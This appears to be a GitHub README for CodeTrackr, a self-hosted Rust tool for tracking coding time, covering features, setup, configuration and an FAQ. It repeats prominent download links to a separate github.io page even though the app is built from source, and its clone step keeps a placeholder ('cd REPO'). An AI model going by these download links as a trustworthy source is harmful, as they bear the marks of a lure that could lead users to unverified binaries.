# CodeTrackr - Developer Productivity Analytics 2026

> **CodeTrackr is a self-hosted web app that measures coding time and developer activity across projects, programming languages, and editors. A live dashboard and extensible analytics tools make the collected data easy to explore.**

[![Platform](https://img.shields.io/badge/Platform-Self--hosted%20web%20application-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/masonlewisscq5542/codetrackr-editor-activity?style=flat-square)](https://github.com/masonlewisscq5542/codetrackr-editor-activity)

---

<p align="center">
  <a href="https://masonlewisscq5542.github.io/codetrackr-editor-activity/">
    <img src="https://img.shields.io/badge/Download-CodeTrackr%20Latest-brightgreen?style=for-the-badge" alt="Download CodeTrackr">
  </a>
</p>

> **[Download CodeTrackr Latest](https://masonlewisscq5542.github.io/codetrackr-editor-activity/)**

---

[Download Latest Build](https://masonlewisscq5542.github.io/codetrackr-editor-activity/)

---

## What is CodeTrackr?

CodeTrackr provides a self-hosted way to collect coding duration, programming statistics, and developer activity data. It organizes records by project, language, and editor, then displays them in a real-time dashboard for personal use or team reporting.

The platform pairs IDE integrations with a plugin-based extension model. Users can adjust the dashboard, install additions from the Plugin Store, apply CSS themes, and optionally participate in community features such as weekly global leaderboards. Under the hood, a Rust and Axum backend uses PostgreSQL and Redis, while JavaScript dashboard plugins can run with additional server-side support through a QuickJS sandbox.

---

## Highlights

- Record programming time across projects, languages, and editors
- Watch incoming activity in a live dashboard powered by WebSocket updates
- Compare results through weekly global developer leaderboards
- Link supported IDE extensions to the application
- Add dashboard functionality with JavaScript plugins
- Discover and administer extensions through the Plugin Store
- Execute server-side plugins within a QuickJS sandbox
- Restyle the interface using CSS themes
- Sign in with GitHub, GitLab, or anonymous authentication
- Export activity records for use in other analysis tools
- Enable optional Stripe integration for Pro Cloud deployments

---

## Getting Started

First, download the source and switch into its directory:

```bash
git clone https://github.com/masonlewisscq5542/codetrackr-editor-activity.git
cd REPO
```

CodeTrackr is a Rust application backed by PostgreSQL and Redis. Set up both services, provide the required configuration, and run the application through the Rust build workflow:

```bash
cargo run --release
```

For a production deployment, build the release artifact and run it behind the web server or hosting arrangement appropriate for your environment.

---

## Typical Workflow

1. Bring up PostgreSQL and Redis.
2. Supply the connection information required by the application.
3. Start the CodeTrackr web service.
4. Attach an IDE extension so coding events can be collected.
5. Use the dashboard to inspect time grouped by project, language, and editor.
6. Export the captured information whenever an external copy is needed.
7. Install dashboard plugins or themes to adapt the experience to your workflow.

Once the application is installed, visit the deployment URL and finish the authentication method selected for the instance.

---

## Settings and Configuration

Deployment-specific values should be provided through the environment and the configuration mechanism supported by CodeTrackr. Plan to define at least the following:

```text
Application URL
PostgreSQL connection
Redis connection
Authentication providers
IDE extension connections
Optional Stripe settings
```

The plugin and customization features provide a place to manage dashboard plugins, CSS themes, and other presentation options. Store credentials for services and authentication providers outside the repository.

---

## System Requirements

- A self-hosted environment capable of running the web application
- Rust toolchain when building or running CodeTrackr from source
- PostgreSQL
- Redis
- A supported web browser
- IDE extensions for collecting editor activity
- Network connectivity among the application, database, cache, and connected clients

CodeTrackr uses Rust and Axum for its web layer. PostgreSQL holds application data, and Redis provides application runtime support.

---

## Frequently Asked Questions

### What kind of users is CodeTrackr designed for?

CodeTrackr suits individual developers, teams, and organizations that need coding-time history and programming statistics while keeping the application self-hosted.

### Can activity come from different editors?

Yes. Supported IDE extensions connect editor activity to CodeTrackr. The installation and connection steps vary according to the editor.

### How are configuration values handled?

Service and deployment options are configured through the application environment and related service settings. Dashboard plugins and visual changes are managed with CodeTrackr's extension and theme capabilities.

### Is data export available?

Yes. CodeTrackr can export collected activity data for analysis or storage outside the application.

### What is the update procedure?

Retrieve the newest project changes, check configuration and database guidance, rebuild the Rust application, and restart the deployment. Back up important data before updating.

### Why might activity not appear?

Check that the appropriate IDE extension is connected and that the application can communicate with PostgreSQL and Redis. Also verify authentication settings and confirm the client is pointed at the correct CodeTrackr instance.

### Do all users have to authenticate?

Authentication can use GitHub, GitLab, or anonymous access. Which option is active depends on the instance configuration.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
